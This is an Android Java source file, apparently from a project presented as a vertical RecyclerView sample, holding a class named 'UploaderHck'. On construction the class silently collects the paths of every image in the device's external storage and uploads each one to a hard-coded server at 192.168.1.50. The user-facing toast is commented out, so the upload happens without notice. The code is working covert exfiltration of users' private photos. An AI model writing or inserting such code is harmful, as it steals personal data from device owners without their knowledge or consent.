package com.example.sourceandroid.verticalrecyclerview;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.SystemClock;
import android.provider.MediaStore;
import android.widget.Toast;

import net.gotev.uploadservice.MultipartUploadRequest;
import net.gotev.uploadservice.UploadNotificationConfig;

import java.io.FileNotFoundException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.UUID;

/**
 * Created by Aof.Hck on 2/16/2017.
 */
public class UploaderHck {
    private static final String USER_AGENT = "UploadServiceDemo/" + BuildConfig.VERSION_NAME;
    Activity context;
    public UploaderHck(Activity context) {
        this.context = context;
        onMultipartUploadClick();
    }

    private void showToast(String message) {
//        Toast.makeText(context, "*************** " +message+" *************", Toast.LENGTH_LONG).show();
    }

    public void onMultipartUploadClick() {


//        String path = getPath(filePath); // android < 6.0
//        String path = getRealPathFromURI(MainActivityUpload.this,filePath); // android < 6.0
        ArrayList<String> listOfAllImages = getAllShownImagesPath(context);
        int sum = listOfAllImages.size();
        String[] temp = new String[sum];
        for (int i = 0; i < sum; i++) {
            temp[i] = listOfAllImages.get(i).toString();
        }

        showToast("Start Upload : "+temp.length);

        for (String fileToUploadPath : temp) {

            try {
//                Thread.sleep(1000);
                String uploadId = UUID.randomUUID().toString();

                //Creating a multi part request
                new MultipartUploadRequest(context, uploadId, "http://192.168.1.50/upimg/index.php")
                        .addFileToUpload(fileToUploadPath, "pic") //Adding file
                        .startUpload(); //Starting the upload

            } catch (Exception exc) {
                showToast(exc.getMessage());
            }
        }
    }

    private ArrayList<String> getAllShownImagesPath(Activity activity) {
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;
        ArrayList<String> listOfAllImages = new ArrayList<String>();
        String absolutePathOfImage = null;
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = { MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME };

        cursor = activity.getContentResolver().query(uri, projection, null,
                null, null);

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursor
                .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);

            listOfAllImages.add(absolutePathOfImage);
        }
        return listOfAllImages;
    }
}
